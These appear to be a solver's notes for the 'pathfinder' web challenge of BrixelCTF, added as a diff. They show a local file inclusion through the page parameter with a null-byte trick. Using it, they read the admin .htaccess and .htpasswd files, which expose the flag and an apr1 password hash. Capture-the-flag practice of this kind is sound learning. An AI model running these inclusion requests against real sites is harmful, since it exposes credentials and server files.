@@ -1,0 +1,21 @@
+http://timesink.be/pathfinder/
+
+http://timesink.be/pathfinder/index.php?page=home.php
+
+http://timesink.be/pathfinder/index.php?page=admin/ind%00ex.php
+	Warning: file_exists() expects parameter 1 to be a valid path, string given in /home/kevinay5/domains/timesink.be/public_html/pathfinder/index.php on line 45
+
+Basic Authentication
+	Find .htpasswd / .htpasswd~ / .htaccess / .htaccess~
+
+page=admin/.htaccess
+	AuthGroupFile /dev/null
+	AuthType Basic
+	AuthUserFile /home/cfromage/domains/epsilom/public_html/pathfinder/admin/.htpasswd
+	AuthName "Admin only!"
+	require valid-user
+	ErrorDocument 401 "Unauthorized Access"
+
+page=admin/.htpasswd
+	#normally you would brute force this, but that is not in scope of this challenge. The flag is: brixelCTF{unsafe_include} <br>
+	admin:$apr1$941ydmlw$aPUW.gCFcvUbIcP0ptVQF0
